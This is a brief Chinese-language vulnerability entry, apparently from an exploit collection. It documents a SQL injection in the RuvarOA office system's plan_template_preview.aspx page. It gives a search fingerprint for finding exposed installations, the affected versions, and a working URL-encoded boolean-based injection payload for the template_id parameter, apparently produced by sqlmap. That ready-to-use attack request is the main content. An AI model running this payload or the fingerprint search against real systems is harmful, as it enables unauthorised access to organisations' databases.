# RuvarOAplan_template_preview存在SQL注入漏洞

- **系统**：RuvarOAplan　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`GET /WorkPlan/plan_template_preview.aspx?template_id=%28SELECT+CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28CASE+WHEN+%281485%3D1485%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%29 H`

**请求体 / payload**
```
qbpvq1qjvjq
sqlmap
GET /WorkPlan/plan_template_preview.aspx?template_id=1 HTTP/1.1
Host:
```

**其他**
- RuvarOA plan\_template\_preview存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RuvarOA v6.01
* RuvarOA v12.01